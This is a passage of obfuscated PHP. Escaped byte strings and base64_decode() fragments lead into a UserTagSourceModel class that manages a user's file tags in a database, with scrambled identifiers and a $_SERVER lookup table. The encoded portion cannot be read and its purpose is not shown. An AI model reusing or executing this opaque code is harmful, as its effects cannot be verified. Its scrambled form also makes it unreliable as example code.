xa0\x5\x12\xc7\x12\xf\x26\xc3\x22\x97\x41\xe4\x56\xd8\x5b\x5d\x86\xe2\x75\x42\xe4\x99\x64\x65\xd5\x5e\xdf\xbc\x51\x42\xa0\x87\x43\xf2\x78\x30\x3a"."\xd1\x5b\x36\x9\x5f\xe8\x84\x72\x29\x90\xa4\xb3\x2c\x3d\xe1\x5d\xc5\xea\x51\xf0\x74\x5f\xd5\x26\xc5\x48\xa6\x63\xa6\xb0\x2a\x1d\x6f\x88\x61\x12\x37\xfa\xac\x68\x5f\x4f\x3\xb1\xd0\x2\x44\x47\x87"."\223\116\123\240\214\364\236\66\136\230\302\347\45\326\320\46\362\110\231\17\140\366\221\222\315\1\200\34\122\103\113\176\261\304\131\22\133\221\70\227\340\222\132\331\322\146\331\222\262"."\161\170\255\274\30\61\145\251\210\234\206\337\102\266\35\123\44\136\104\160\277\204\100\144\5\364\370\357\220\2\300\265\261\14\222\256\121\21\53\237\161\76\255\102\22\11\230\271\107"."\205\32\244\213\100\347\75\54\367\371\136\105\156\53\106\104\112\46\245\230\327\75\364\213\155\110\303\302\251\6\111\246\127\34\201\21\215\373\255\161\227\162\276\300\56\335\332\246\11"."\102\206\252\57\346\304\175\241\304\254\260\142\370\234\45\366\21\27\274\326\203\342\131\155\104\160\132\202\323\317\144\72\265\221\32\131\63\354\254\303\241\10\302\263\22\116\115\62\277"."\26\266\21\372\250\373\305\145\237\154\262\355\310\130\15\25\346\331\122\171\161\105\43\272\211\141\265\272\117\26\232\263\270\154\376\315\221\112\200\350\343\30\134\305\101\72\125\141\35"."\x10\xa1\xfb\x40\xbb\xc2\x85\x7\xe2\x93\x4e\x63\x73\x9e\x8d\xcf\x19\xca\x43\xc\xa7\xbc\xe\xa8\xeb\x9c\x88\xe5\x34\x8c\xed\x70\x25\x59\xf2\x6b\xc9\xce\xcb\x58\x59\x9a\x21\xa1\x80\x9e\x8f\x48\xd5".base64_decode('yRe1kxZI1P6IwErnEEtW+iKB7ZCmY/AlEsk7BjnjcqKjOe6pJccagb4UWCBCYpoWcA==').base64_decode('JtH8uqv1cgF3z2gJa9Sw0znprFWdWA0vVw0qfKh2e92tYmPqPoGKSqraI2l7JM0aZQ==')."\x68\x8b\x6a\x16\xa3\x49\xb8\xa4\xe0\x79\x1d\x65\x27\x19\x2\x5c\x96\x26\xe1\xb2\x55\xc9\xac\xb0\x24\xbc\x91\xca\xd9\x5a\xc5\x9a\xa4\x7b\xd5\x83\x7\x12\x8d\x4c\x8d\xe\x8b\x73\xbf\x94\x75\xb2\xf1"."\254\231\271\372\163\200\161\356\334\104\4\122\273\25\102\162\341\272\165\257\325\212\232\231\47\155\205\310\355\332\5\152\321\132\226\122\203\272\122\312\61\251\46\212\320\316\250\46\363"."\42\255\206\256\10\375\44\336\302\145\247\134\65\222\145\305\223\332\252\51\361\232\224\301\162\352\214\270\340\362\270\201\117\127\140\276\0\31\321\151\64\157\14\13\235\74\246\222\77"."\335\101\376\53\305\341\242\311\267\224\214\120\271\304\352\342\201\262\173\234\253\152\163\242\161\261\42\271\311\255\151\41\340\301\262\203\352\123\172\136\343\106\131\102\155\211\36\253\114"."\333\110\353\116\137\274\262\157\56\232\316\76\222\227\4\223\56\231\240\220\144\70\164\32\152\110\312\10\10\330\76\41\236\247\365\111\14\215\300\11\207\1\17\145\43\340\126\203\136"."\x88\x6\xf1\xc5\x3b\xbf\xa\x23\x7e\x64\xe9\xb6\x4b\x93\x13\x66\xd9\xf6\xe0\xb4\xa4\x59\x22\xbf\xed\xa6\x6d\xb\x5\x1\x2a\x3a\x20\xbc\x22\xde\x3b\x3d\x92\xfe\xb\xa\x89\x7b\x2f\xdc\x28\x72\xa1"."\102\320\226\120\37\22\204\253\131\174\46\117\350\64\225\320\54\107\4\137\324\360\210\274\65\302\25\155\147\305\165\211\54\0\350\0\234\62\307\230\103\54\354\53\100\264\107\134\345"."\x68\x6e\x7e\x50\xb0\x32\x80\x8a\xb2\x36\xf\xf1\xc8\x60\xf9\x69\x8a\x1f\x5e\x7a\xf0\x92\x3a\xe0\x6d\x37\xdf\xfa\xd2\x90\xa3\x38\x7d\x15\x8b\x6b\xdd\x7e\x5d\xd\x20\xce\x15\x55\x50\x37\xef\x44\xb6"."\6\6\106\211\144\242\52\251\67\220\110\254\216\305\73\250\127\370\252\144\122\112\322\216\252\112\352\355\216\105\47\113\13\365\4\302\221\252\64\254\110\25\125\205\153\65\232\24\356"."\x25\xad\x24\xb7\x91\x93\xb5\x22\x1c\x5c\x21\x5a\x42\xee\xbd\xc5\x2d\x41\x29\x67\x32\xe1\x3f\xbb\x45\x49\x68\x79\x26\x7\x90\xa4\xc8\x7a\x41\xf8\xd4\x13\x65\x9c\xe2\xd\x79\x5e\x2d\xe6\xfc\x92\x7"."\234\117\54\271\364\25\31\302\102\105\130\11\52\12\165\307\113\0\305\136\362\371\272\167\360\334\152\251\142\273\234\144\323\33\122\251\317\224\51\161\350\4\110\160\262\174\10\75\222"."\xd0\x52\xde\xb6\x9\x60\x66\xcd\x31\x94\x5\xcf\xd5\x97\x22\x24\x55\x8c\x11\x6e\xfb\x72\x13\x94\xec\xd6\x9b\x29\xe9\xd2\x83\x1e\x8a\xc0\xa\x18\x46\x5d\xd2\x85\xa3\x61\x47\xb2\xad\xd\xd5\xbc\x1a".base64_decode('pwJGTCCE6O9/A/68mfhnrwAA').base64_decode(''), 10, -8))); goto E¸©½­´½; D«éÓÛî“î: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($Õ·”Ñ”ª) { $µú¹µôğ =& $_SERVER[•€áå–Õ]; return array($µú¹µôğ[2002] => array($µú¹µôğ[2394] . USER_ID, $µú¹µôğ[2003])); } protected function listData() { $š¶¡üëÇ =& $_SERVER[•€áå–Õ]; $¬µîŒ™  = array($š¶¡üëÇ[1684] => USER_ID, $š¶¡üëÇ[537] => array($š¶¡üëÇ[2006], 0)); $Ù¾‹¶¢â = $š¶¡üëÇ[2395]; $¸ÁíÂ‹× = $this->field($Ù¾‹¶¢â)->where($¬µîŒ™ )->order($š¶¡üëÇ[2009])->select(); return $¸ÁíÂ‹× ? $¸ÁíÂ‹× : array(); } protected function addToTag($ö¶â¬, $†°©›¹ó) { $’£èŠÏ¾ =& $_SERVER[•€áå–Õ]; if (!Model($’£èŠÏ¾[2152])->listData($†°©›¹ó)) { return !1; } if (is_numeric($ö¶â¬)) { $ËÙ¢·ËÓ = Model($’£èŠÏ¾[866])->pathInfo($ö¶â¬); if (!$ËÙ¢·ËÓ) { return !1; } } else { $ËÙ¢·ËÓ = IO::infoSimple($ö¶â¬); if (!$ËÙ¢·ËÓ) { return !1; } $ê£ËÈ¨‘ = $ËÙ¢·ËÓ[$’£èŠÏ¾[42]]; $ğ‹³‡Ú³ = $ËÙ¢·ËÓ[$’£èŠÏ¾[43]]; if (isset($ËÙ¢·ËÓ[$’£èŠÏ¾[464]])) { $ğ‹³‡Ú³ = $ËÙ¢·ËÓ[$’£èŠÏ¾[464]] == $’£èŠÏ¾[100] ? $’£èŠÏ¾[87] : $’£èŠÏ¾[226]; } } $”äúİ¯· = array($’£èŠÏ¾[1684] => USER_ID, $’£èŠÏ¾[537] => $†°©›¹ó, $’£èŠÏ¾[474] => $ö¶â¬, $’£èŠÏ¾[475] => $ğ‹³‡Ú³ ? $ğ‹³‡Ú³ : $’£èŠÏ¾[469], $’£èŠÏ¾[473] => $ê£ËÈ¨‘ ? $ê£ËÈ¨‘ : $’£èŠÏ¾[22], $’£èŠÏ¾[1895] => 0); if ($this->where($”äúİ¯·)->find()) { return !1; } return $this->add($”äúİ¯·); } protected function removeFromTag($ãíÏõô®, $ËÓÙÆ‹Õ) { $ÆäÊìü¬ =& $_SERVER[•€áå–Õ]; if (!Model($ÆäÊìü¬[2152])->listData($ËÓÙÆ‹Õ)) { return !1; } if (is_array($ãíÏõô®)) { $ãíÏõô® = array($ÆäÊìü¬[17], $ãíÏõô®); } $¸İ ĞÜù = array($ÆäÊìü¬[1684] => USER_ID, $ÆäÊìü¬[537] => $ËÓÙÆ‹Õ, $ÆäÊìü¬[474] => $ãíÏõô®); return $this->where($¸İ ĞÜù)->delete(); } protected function removeByTag($ˆ¦ÕÜÜë) { $õÌ§¬— =& $_SERVER[•€áå–Õ]; if (!$ˆ¦ÕÜÜë) { return !1; } $õêò©’ = array($õÌ§¬—[1684] => USER_ID, $õÌ§¬—[537] => $ˆ¦ÕÜÜë); return $this->where($õêò©’)->delete(); } protected function removeBySource($Ò›Ìˆ»Ğ) { $¸ÇÍÛ™ =& $_SERVER[•€áå–Õ]; if (is_array($Ò›Ìˆ»Ğ)) { $Ò›Ìˆ»Ğ = array($¸ÇÍÛ™[17], $Ò›Ìˆ»Ğ); } $¡¼¹†ø = array($¸ÇÍÛ™[1684] => USER_ID, $¸ÇÍÛ™[537] => array($¸ÇÍÛ™[1055], 0), $¸ÇÍÛ™[474] => $Ò›Ìˆ»Ğ); return $this->where($¡¼¹†ø)->delete(); } }